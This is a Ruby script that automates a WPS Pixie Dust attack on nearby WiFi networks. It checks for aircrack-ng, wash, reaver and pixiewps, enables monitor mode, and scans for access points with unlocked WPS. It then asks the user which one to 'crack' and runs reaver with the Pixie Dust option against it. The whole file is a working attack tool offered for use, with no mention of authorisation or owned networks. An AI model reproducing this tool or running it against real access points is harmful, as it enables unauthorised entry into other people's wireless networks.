# Run this script with root priveleges: sudo ruby swps.rb

WAIT_FOR_WASH = 45 #seconds

def check_packages
  airmon = `airmon-zc`
  if airmon.include?("No command")
    puts "Please install aircrack-ng: https://www.aircrack-ng.org/"
    exit
  end
  if airmon.include?("Run it as root")
    puts "Please run this script as root"
    exit
  end
  wash = `wash`
  if wash.include?("No command")
    puts "Please install wash"
    exit
  end
  reaver = `reaver`
  if !reaver.include?("Run pixiedust attack")
    puts "Please install reaver (exactly this version): https://github.com/t6x/reaver-wps-fork-t6x"
    exit
  end
  pixie = `pixiewps`
  if pixie.include?("No command")
    puts "Please install pixiewps: https://github.com/wiire-a/pixiewps"
  end
end

def get_wlan_interface
  cmd = 'ifconfig'
  puts "Checking for wireless interface: #{cmd}"
  interfaces = `"#{cmd}"`
  interface_arr = interfaces.split("\n\n")
  wlan_interface = ''
  interface_arr.each do |interface|
    name = interface.split(" ")[0]
    if name[0..1] == "wl"
      wlan_interface = name
      break
    end
  end
  if wlan_interface[wlan_interface.length-3..-1] == 'mon'
    monitor_enabled = true
  else
    monitor_enabled = false
  end
  if wlan_interface.length > 0
    if monitor_enabled
      puts "Found wireless interface in monitor mode: #{wlan_interface}"
    else
      puts "Found wireless interface: #{wlan_interface}"
    end
  else
    puts "Wireless interface not found, exiting"
    exit!
  end
  {
      name: wlan_interface,
      monitor: monitor_enabled
  }
end

def run_airmon_zc(wlan_name)
  cmd = "sudo airmon-zc start #{wlan_name}"
  puts "Starting airmon: #{cmd}"
  `#{cmd}`
end

def run_wash(wlan_name)
  cmd = "sudo wash -i #{wlan_name}"
  puts "Starting wash: #{cmd}, waiting for #{WAIT_FOR_WASH} seconds to gather information about WiFi access points"
  p = IO.popen(cmd)
  process_line = false
  wifi_points = []

  Thread.new do
    p.each_line do |line|
      if process_line
        wifi_hash = process_wash_line(line)
        if wifi_hash[:locked] == "No"
          wifi_points << wifi_hash
        end
      end
      if line.include?('-------')
        process_line = true
      end
    end
  end

  Thread.new do
    start_time = Time.now
    while true do
      sleep(5)
      diff = Time.now - start_time
      print "%.0f" % diff + '... '
      if diff > WAIT_FOR_WASH
        puts "\nKilling wash"
        Process.kill("INT", p.pid)
        break
      end
    end
  end.join

  wifi_points
end

def process_wash_line(line)
  fields = line.split(" ")
  wifi_point = {
      bssid: fields[0],
      channel: fields[1],
      power: fields[2],
      version: fields[3],
      locked: fields[4],
      vendor: fields[5],
      essid: fields[6]
  }
  wifi_point
end

def select_point_to_crack(access_points, wlan_iface_name)
  access_points = access_points.sort_by { |access_point| access_point[:power] }
  puts "Make your choice on starting Reaver (enter number from 0 to #{access_points.length - 1}):"
  access_points.each_with_index do |access_point, idx|
    puts "#{idx}. #{access_point[:essid]} #{access_point[:vendor]} #{access_point[:bssid]} #{access_point[:power]}dB"
  end
  print "I want to crack acces point numer (the lesser the better):"
  n = input_number(access_points.length)
  point_to_crack = access_points[n]
  cmd = "sudo reaver -i #{wlan_iface_name} -c #{point_to_crack[:channel]} -b #{point_to_crack[:bssid]} -vvv -K 1"
  puts "Starting Reaver on selected acces point: #{cmd}"
  exec(cmd)
end

def input_number(max)
  while true
    input = gets
    if input.match(/^\d+$/)
      n = input.to_i
      if n < max
        break
      end
    end
    print "Please enter a digit between 0 and #{max - 1}:"
  end
  n
end

check_packages
wlan_iface = get_wlan_interface
wlan_iface_name = wlan_iface[:name]
if !wlan_iface[:monitor]
  run_airmon_zc(wlan_iface[:name])
  wlan_iface_name += 'mon'
end
wifi_access_points = run_wash(wlan_iface_name)
select_point_to_crack(wifi_access_points, wlan_iface_name)


